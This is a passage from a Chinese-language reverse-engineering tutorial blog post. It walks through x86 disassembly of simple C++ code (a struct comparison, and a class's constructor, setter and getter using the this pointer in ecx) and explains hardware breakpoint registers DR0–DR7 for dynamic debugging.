class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A1450 &gt;  55              push    ebp</span><br><span class=\"line\">012A1451    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A1453    81EC D0000000   sub     esp,0xD0</span><br><span class=\"line\">012A1459    53              push    ebx</span><br><span class=\"line\">012A145A    56              push    esi</span><br><span class=\"line\">012A145B    57              push    edi</span><br><span class=\"line\">012A145C    8DBD 30FFFFFF   lea     edi,dword ptr ss:[ebp-0xD0]</span><br><span class=\"line\">012A1462    B9 34000000     mov     ecx,0x34</span><br><span class=\"line\">012A1467    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A146C    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A146E    C745 F4 0100000&gt;mov     dword ptr ss:[ebp-0xC],0x1</span><br><span class=\"line\">012A1475    C745 F8 0200000&gt;mov     dword ptr ss:[ebp-0x8],0x2</span><br><span class=\"line\">012A147C    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">012A147F    50              push    eax</span><br><span class=\"line\">012A1480    E8 CAFCFFFF     call    012A114F</span><br><span class=\"line\">//012A114F   /E9 5C020000     jmp     Max</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">012A1485    83C4 04         add     esp,0x4</span><br><span class=\"line\">012A1488    8BF4            mov     esi,esp</span><br><span class=\"line\">012A148A    6A 08           push    0x8</span><br><span class=\"line\">012A148C    68 40572A01     push    012A5740                         ; ASCII &quot;%d\\n&quot;</span><br><span class=\"line\">012A1491    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;&gt;; msvcr90d.printf</span><br><span class=\"line\">012A1497    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A149A    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A149C    E8 A4FCFFFF     call    012A1145</span><br><span class=\"line\">012A14A1    33C0            xor     eax,eax</span><br><span class=\"line\">012A14A3    52              push    edx</span><br><span class=\"line\">012A14A4    8BCD            mov     ecx,ebp</span><br><span class=\"line\">012A14A6    50              push    eax</span><br><span class=\"line\">012A14A7    8D15 C8142A01   lea     edx,dword ptr ds:[0x12A14C8]</span><br><span class=\"line\">012A14AD    E8 DAFBFFFF     call    012A108C</span><br><span class=\"line\">012A14B2    58              pop     eax</span><br><span class=\"line\">012A14B3    5A              pop     edx</span><br><span class=\"line\">012A14B4    5F              pop     edi</span><br><span class=\"line\">012A14B5    5E              pop     esi</span><br><span class=\"line\">012A14B6    5B              pop     ebx</span><br><span class=\"line\">012A14B7    81C4 D0000000   add     esp,0xD0</span><br><span class=\"line\">012A14BD    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A14BF    E8 81FCFFFF     call    012A1145</span><br><span class=\"line\">012A14C4    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A14C6    5D              pop     ebp</span><br><span class=\"line\">012A14C7    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>当 haha.x-&gt; 1 和 haha.x -&gt; 2</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101344910.png\" alt=\"image-20221110101344910\"></p>\n<p>Max:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">012A13B0 &gt;  55              push    ebp</span><br><span class=\"line\">012A13B1    8BEC            mov     ebp,esp</span><br><span class=\"line\">012A13B3    81EC C0000000   sub     esp,0xC0</span><br><span class=\"line\">012A13B9    53              push    ebx</span><br><span class=\"line\">012A13BA    56              push    esi</span><br><span class=\"line\">012A13BB    57              push    edi</span><br><span class=\"line\">012A13BC    8DBD 40FFFFFF   lea     edi,dword ptr ss:[ebp-0xC0]</span><br><span class=\"line\">012A13C2    B9 30000000     mov     ecx,0x30</span><br><span class=\"line\">012A13C7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">012A13CC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">012A13CE    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D1    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13D4    8B10            mov     edx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13D6    3B51 04         cmp     edx,dword ptr ds:[ecx+0x4]</span><br><span class=\"line\">012A13D9    7E 1F           jle     short 012A13FA</span><br><span class=\"line\">012A13DB    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13DD    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13E0    8B08            mov     ecx,dword ptr ds:[eax]</span><br><span class=\"line\">012A13E2    51              push    ecx</span><br><span class=\"line\">012A13E3    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A13E8    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A13EE    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A13F1    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A13F3    E8 4DFDFFFF     call    012A1145</span><br><span class=\"line\">012A13F8    EB 1E           jmp     short 012A1418</span><br><span class=\"line\">012A13FA    8BF4            mov     esi,esp</span><br><span class=\"line\">012A13FC    8B45 08         mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">012A13FF    8B48 04         mov     ecx,dword ptr ds:[eax+0x4]</span><br><span class=\"line\">012A1402    51              push    ecx</span><br><span class=\"line\">012A1403    68 3C572A01     push    012A573C                               ; ASCII &quot;%d&quot;</span><br><span class=\"line\">012A1408    FF15 BC822A01   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]      ; msvcr90d.printf</span><br><span class=\"line\">012A140E    83C4 08         add     esp,0x8</span><br><span class=\"line\">012A1411    3BF4            cmp     esi,esp</span><br><span class=\"line\">012A1413    E8 2DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1418    5F              pop     edi</span><br><span class=\"line\">012A1419    5E              pop     esi</span><br><span class=\"line\">012A141A    5B              pop     ebx</span><br><span class=\"line\">012A141B    81C4 C0000000   add     esp,0xC0</span><br><span class=\"line\">012A1421    3BEC            cmp     ebp,esp</span><br><span class=\"line\">012A1423    E8 1DFDFFFF     call    012A1145</span><br><span class=\"line\">012A1428    8BE5            mov     esp,ebp</span><br><span class=\"line\">012A142A    5D              pop     ebp</span><br><span class=\"line\">012A142B    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>this 看 ecx</p>\n<p>ecx 在内存中为：<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221110101730211.png\" alt=\"image-20221110101730211\"></p>\n<h3 id=\"反汇编中构造函数和析构函数的识别\"><a class=\"markdownIt-Anchor\" href=\"#反汇编中构造函数和析构函数的识别\">#</a> 反汇编中构造函数和析构函数的识别</h3>\n<p>代码如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">class MyTest</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    MyTest();</span><br><span class=\"line\">    ~MyTest();</span><br><span class=\"line\">    void SetTest(DWORD dwTest);</span><br><span class=\"line\">    DWORD GetTest();</span><br><span class=\"line\">public:</span><br><span class=\"line\">    DWORD m_dwTest;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"> MyTest::MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     printf(&quot;1111\\n&quot;);</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> MyTest::~MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">    printf(&quot;2222\\n&quot;);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void MyTest::SetTest(DWORD dwTest)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    this-&gt;m_dwTest = dwTest;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD MyTest::GetTest()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return this-&gt;m_dwTest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyTest Test;</span><br><span class=\"line\">\tTest.SetTest(1);</span><br><span class=\"line\">\tint Number = Test.GetTest();</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对应的汇编代码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11550 &gt;  55              push    ebp</span><br><span class=\"line\">00D11551    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11553    6A FF           push    -0x1</span><br><span class=\"line\">00D11555    68 E846D100     push    00D146E8</span><br><span class=\"line\">00D1155A    64:A1 00000000  mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00D11560    50              push    eax</span><br><span class=\"line\">00D11561    81EC E4000000   sub     esp,0xE4</span><br><span class=\"line\">00D11567    53              push    ebx</span><br><span class=\"line\">00D11568    56              push    esi</span><br><span class=\"line\">00D11569    57              push    edi</span><br><span class=\"line\">00D1156A    8DBD 10FFFFFF   lea     edi,dword ptr ss:[ebp-0xF0]</span><br><span class=\"line\">00D11570    B9 39000000     mov     ecx,0x39</span><br><span class=\"line\">00D11575    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1157A    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1157C    A1 0080D100     mov     eax,dword ptr ds:[__security_coo&gt;</span><br><span class=\"line\">00D11581    33C5            xor     eax,ebp</span><br><span class=\"line\">00D11583    50              push    eax</span><br><span class=\"line\">00D11584    8D45 F4         lea     eax,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D11587    64:A3 00000000  mov     dword ptr fs:[0],eax</span><br><span class=\"line\">00D1158D    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11595    C745 FC 0000000&gt;mov     dword ptr ss:[ebp-0x4],0x0</span><br><span class=\"line\">00D1159C    6A 01           push    0x1</span><br><span class=\"line\">00D1159E    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115A6    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115AE    8945 E0         mov     dword ptr ss:[ebp-0x20],eax</span><br><span class=\"line\">00D115B1    8BF4            mov     esi,esp</span><br><span class=\"line\">00D115B3    FF15 C492D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;; msvcr90d.getchar</span><br><span class=\"line\">00D115B9    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D115BB    E8 8AFBFFFF     call    00D1114A</span><br><span class=\"line\">00D115C0    C785 14FFFFFF 0&gt;mov     dword ptr ss:[ebp-0xEC],0x0</span><br><span class=\"line\">00D115CA    C745 FC FFFFFFF&gt;mov     dword ptr ss:[ebp-0x4],-0x1</span><br><span class=\"line\">00D115D1    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115D4    E8 4FFAFFFF     call    00D11028</span><br><span class=\"line\">00D115D9    8B85 14FFFFFF   mov     eax,dword ptr ss:[ebp-0xEC]</span><br><span class=\"line\">00D115DF    52              push    edx</span><br><span class=\"line\">00D115E0    8BCD            mov     ecx,ebp</span><br><span class=\"line\">00D115E2    50              push    eax</span><br><span class=\"line\">00D115E3    8D15 1016D100   lea     edx,dword ptr ds:[0xD11610]</span><br><span class=\"line\">00D115E9    E8 A3FAFFFF     call    00D11091</span><br><span class=\"line\">00D115EE    58              pop     eax</span><br><span class=\"line\">00D115EF    5A              pop     edx</span><br><span class=\"line\">00D115F0    8B4D F4         mov     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D115F3    64:890D 0000000&gt;mov     dword ptr fs:[0],ecx</span><br><span class=\"line\">00D115FA    59              pop     ecx</span><br><span class=\"line\">00D115FB    5F              pop     edi</span><br><span class=\"line\">00D115FC    5E              pop     esi</span><br><span class=\"line\">00D115FD    5B              pop     ebx</span><br><span class=\"line\">00D115FE    81C4 F0000000   add     esp,0xF0</span><br><span class=\"line\">00D11604    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11606    E8 3FFBFFFF     call    00D1114A</span><br><span class=\"line\">00D1160B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1160D    5D              pop     ebp</span><br><span class=\"line\">00D1160E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D113E0 &gt;  55              push    ebp</span><br><span class=\"line\">00D113E1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D113E3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D113E9    53              push    ebx</span><br><span class=\"line\">00D113EA    56              push    esi</span><br><span class=\"line\">00D113EB    57              push    edi</span><br><span class=\"line\">00D113EC    51              push    ecx</span><br><span class=\"line\">00D113ED    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D113F3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D113F8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D113FD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D113FF    59              pop     ecx</span><br><span class=\"line\">00D11400    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11403    8BF4            mov     esi,esp</span><br><span class=\"line\">00D11405    68 3C67D100     push    00D1673C                                 ; ASCII &quot;1111\\n&quot;</span><br><span class=\"line\">00D1140A    FF15 CC92D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]        ; msvcr90d.printf</span><br><span class=\"line\">00D11410    83C4 04         add     esp,0x4</span><br><span class=\"line\">00D11413    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D11415    E8 30FDFFFF     call    00D1114A</span><br><span class=\"line\">00D1141A    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D1141D    5F              pop     edi</span><br><span class=\"line\">00D1141E    5E              pop     esi</span><br><span class=\"line\">00D1141F    5B              pop     ebx</span><br><span class=\"line\">00D11420    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">00D11426    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11428    E8 1DFDFFFF     call    00D1114A</span><br><span class=\"line\">00D1142D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1142F    5D              pop     ebp</span><br><span class=\"line\">00D11430    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D114C0 &gt;  55              push    ebp</span><br><span class=\"line\">00D114C1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D114C3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D114C9    53              push    ebx</span><br><span class=\"line\">00D114CA    56              push    esi</span><br><span class=\"line\">00D114CB    57              push    edi</span><br><span class=\"line\">00D114CC    51              push    ecx</span><br><span class=\"line\">00D114CD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D114D3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D114D8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D114DD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D114DF    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\">//以下四句为\tTest.SetTest(1);的关键代码</span><br><span class=\"line\">00D114E0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx    ;ecx此时为this, i = this </span><br><span class=\"line\">00D114E3    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]\t  ;ebp-8是this, eax=this</span><br><span class=\"line\">00D114E6    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]    ;ecx = 1 ,ebp+8是从外面传来的1</span><br><span class=\"line\">00D114E9    8908            mov     dword ptr ds:[eax],ecx        ;this-&gt;m = 1</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">00D114EB    5F              pop     edi</span><br><span class=\"line\">00D114EC    5E              pop     esi</span><br><span class=\"line\">00D114ED    5B              pop     ebx</span><br><span class=\"line\">00D114EE    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D114F0    5D              pop     ebp</span><br><span class=\"line\">00D114F1    C2 0400         retn    0x4</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D11510 &gt;  55              push    ebp</span><br><span class=\"line\">00D11511    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11513    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D11519    53              push    ebx</span><br><span class=\"line\">00D1151A    56              push    esi</span><br><span class=\"line\">00D1151B    57              push    edi</span><br><span class=\"line\">00D1151C    51              push    ecx</span><br><span class=\"line\">00D1151D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D11523    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D11528    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1152D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1152F    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//以下三句为int Number = Test.GetTest();的关键代码</span><br><span class=\"line\">00D11530    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11533    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D11536    8B00            mov     eax,dword ptr ds:[eax]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11538    5F              pop     edi</span><br><span class=\"line\">00D11539    5E              pop     esi</span><br><span class=\"line\">00D1153A    5B              pop     ebx</span><br><span class=\"line\">00D1153B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1153D    5D              pop     ebp</span><br><span class=\"line\">00D1153E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"动态调试基础\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础\">#</a> 动态调试基础</h2>\n<h3 id=\"断点\"><a class=\"markdownIt-Anchor\" href=\"#断点\">#</a> 断点</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DR0~DR3这四个寄存器是断点地址存储器,用于保存断点的地址</span><br><span class=\"line\">DR6是调试状态寄存器用于指明DR0~DR3寄存器中哪一个产生了调试异常</span><br><span class=\"line\">DR6寄存器使用比特位B0~B3来指明DR0~DR3中哪个产生了调试异常</span><br><span class=\"line\">DR7是断点属性控制器</span><br><span class=\"line\">DR7寄存器分别保存着DR0~DR3的断点地址对应的断点的属性,属性有如下几种:</span><br><span class=\"line\">L0~L3:这个比特位等于1,则断点为本地断点.</span><br><span class=\"line\">G0~G3:这个比特位等于1,则断点为全局断点.</span><br><span class=\"line\">R/W0-R/W3:</span><br><span class=\"line\">00：执行断点</span><br><span class=\"line\">01：数据写入断点</span><br><span class=\"line\">10：I/0读写断点</span><br><span class=\"line\">11：读写断点()读取指令不算)</span><br></pre></td></tr></table></figure>\n<p>DR0-DR3 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191812086-b457e0fc-6a04-403f-a7f4-848fd2617c6e.png\" alt=\"img\"></p>\n<p>删除硬件断点 调试 -&gt; 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191872090-b8599c55-b435-459d-9cbc-ec378d651497.png\" alt=\"img\"></p>\n<p>设置硬件断点  右键 -&gt; 断点 -&gt; 硬件执行</p>\n<p><img 